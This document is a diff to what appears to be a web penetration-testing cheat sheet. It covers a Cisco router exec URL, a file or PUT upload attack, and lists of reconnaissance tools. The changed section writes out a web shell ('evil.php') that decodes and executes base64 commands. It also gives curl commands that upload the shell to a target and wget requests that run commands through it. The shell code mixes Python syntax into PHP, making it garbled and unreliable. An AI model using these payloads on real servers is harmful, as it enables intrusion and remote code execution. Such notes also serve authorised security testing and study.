@@ -35,7 +35,7 @@ hacker:  use Metasploit browser autopwn
 # Cisco Router
 
 x is between 15 and 99.
-https://targetIP/level/x/exec/-/show
+https://target IP/level/x/exec/-/show
 ------------------------------------------------------------------------------------------------------
 
 # ColdFusion
@@ -80,7 +80,7 @@ View Selection Source - post DOM
 Inspector - post DOM
 ------------------------------------------------------------------------------------------------------
 
-# File Upload Vuln
+# File or PUT Upload Vuln
 
 Create a PHP file called evil.php 
 <?php
@@ -89,11 +89,14 @@ $decode=base64_decode($cmd);
 os.system($decode);
 ?>
 
+curl --upload-file evil.php -v --url http://target IP/evil.php
+curl -iksX PUT -d 'evil.php' <target IP>
+
 Once the malicious file is in place, pass base64 encoded commands to it, and get basic code execution 
   on the web server, as the "apache" user.
 
-wget -O output -o /dev/null www.target.com/photos/evil.php?cmd=$(echo id|base64)
-wget -O output -o /dev/null www.target.com/photos/evil.php?cmd=$(echo ifconfig|base64)
+wget -O output -o /dev/null www.target.com/evil.php?cmd=$(echo id|base64)
+wget -O output -o /dev/null www.target.com/evil.php?cmd=$(echo ifconfig|base64)
 ------------------------------------------------------------------------------------------------------
 
 # Fuzzing
@@ -218,18 +221,19 @@ https://forum.bugcrowd.com/t/tutorial-injectx-to-find-xss/790
 
 # Example Test
 
-Target > Scope > Include in Scope > select your URL > Edit > Host or IP range: remove ^
+whois and dig
+Firefox with Wapalyzer plugin.
+nmap, joomscan, nikto, whatweb, and wpscan.
+sslscan and sslyze.
+dirb
 
-Manually craw the app
-
-Target > Site map > Content > select all of the lines > RC > Highlight
+Burp
+Manually craw the app with Firefox
 
 Spider the app
 
-Run Nikto
-
-Burp > Target > Site map > RC on root folder > Engagement tools > Discover content > Config > Target: check 
-  Directories only, and disable Recurse subdirectories
+Burp > Target > Site map > RC on root folder > Engagement tools > Discover content > Config > 
+  Target: check Directories only, and disable Recurse subdirectories
 Filenames: disable both long names
 Discovery Engine: Sensitive
 	Disable Copy content from suite site map
